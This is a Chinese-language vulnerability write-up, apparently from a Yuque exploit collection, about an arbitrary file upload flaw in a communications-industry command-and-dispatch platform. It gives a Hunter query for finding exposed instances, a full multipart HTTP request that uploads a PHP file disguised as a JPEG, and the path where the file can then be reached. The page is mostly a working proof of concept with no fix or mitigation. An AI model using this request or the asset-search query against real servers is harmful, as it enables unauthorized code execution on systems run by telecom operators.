# 指挥调度平台event_uploadfile存在任意文件上传漏洞

# 一、漏洞简介
<font style="color:rgb(51, 51, 51);">指挥调度管理平台是一个专业针对通信行业的管理平台。该产品旨在提供高效的指挥调度喝管理解决方案，以帮助通信运营商或相关机构实现更好的运营效率和服务质量。该平台提供强大的指挥调度功能，可以实时监控和管理通信网络设备、维护人员和工作任务等。用户可以通过该平台发送指令、调度人员、分配任务。</font>指挥调度平台event_uploadfile存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ 指挥调度平台

# 三、资产测绘
+ hunter`web.body="app/structure/departments.php"`
+ 特征

![1701096622884-9c34ec74-7f59-464c-b435-5a6ccd465c74.png](./img/ojv9dkJApB3BJyaT/1701096622884-9c34ec74-7f59-464c-b435-5a6ccd465c74-308583.png)

# 四、漏洞复现
```plain
POST /api/client/event/uploadfile.php HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36
Connection: close
Content-Length: 179
Content-Type: multipart/form-data; boundary=htu3qcyui73l2jtyqwnk
Accept-Encoding: gzip, deflate

--htu3qcyui73l2jtyqwnk
Content-Disposition: form-data; name="uploadfile"; filename="stc.php"
Content-Type: image/jpeg

<?php echo 111*111;?>
--htu3qcyui73l2jtyqwnk--

```

![1701096805339-6c486035-e40d-4fa4-a928-29e83b27b7b7.png](./img/ojv9dkJApB3BJyaT/1701096805339-6c486035-e40d-4fa4-a928-29e83b27b7b7-231504.png)

上传文件位置

```plain
/upload/event/ccc78e2b-5e61-49c0-9050-3a29687b2e81.php
```

![1701096849479-93ad2b75-2bba-47cd-a3eb-30b49de88bb3.png](./img/ojv9dkJApB3BJyaT/1701096849479-93ad2b75-2bba-47cd-a3eb-30b49de88bb3-235066.png)



> 更新: 2024-02-29 23:55:44  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/llu0mvvzuhvpu9ag>